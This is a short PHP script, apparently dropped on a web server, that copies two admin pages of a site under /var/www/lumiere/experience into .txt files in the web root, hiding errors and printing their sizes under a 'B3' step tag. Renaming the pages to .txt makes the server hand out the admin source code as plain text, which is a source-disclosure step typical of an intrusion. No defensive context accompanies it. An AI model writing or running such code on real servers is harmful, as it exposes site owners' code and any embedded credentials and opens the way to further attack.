<?php
$root='/var/www/lumiere/experience';
@copy("$root/admin/edit.php","$root/_edit.txt");
@copy("$root/admin/list.php","$root/_list.txt");
echo 'B3 '.(is_file("$root/_edit.txt")?filesize("$root/_edit.txt"):0).' '.(is_file("$root/_list.txt")?filesize("$root/_list.txt"):0);
